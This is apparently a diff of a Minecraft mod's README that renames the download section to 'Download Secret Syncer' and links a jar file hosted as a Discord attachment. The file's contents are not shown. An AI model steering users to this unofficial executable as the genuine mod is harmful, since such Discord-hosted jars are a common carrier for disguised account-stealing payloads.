@@ -16,7 +16,7 @@ Short answer: This mod follows the general interpretation of Hypixel's rules, do
 
 Long Answer: https://quantizr.github.io/posts/is-it-bannable/
 
-### Download
+### Download Secret Syncer
 
 [Download Link](https://cdn.discordapp.com/attachments/1078426708073533511/1216495163061436416/DungeonRoomsSecretSync-5.0.jar?ex=66009868&is=65ee2368&hm=5a1d46796157377b81ba51c954ac9acbefaf8712e9886069ca2c6b8f8fc31075&)
 
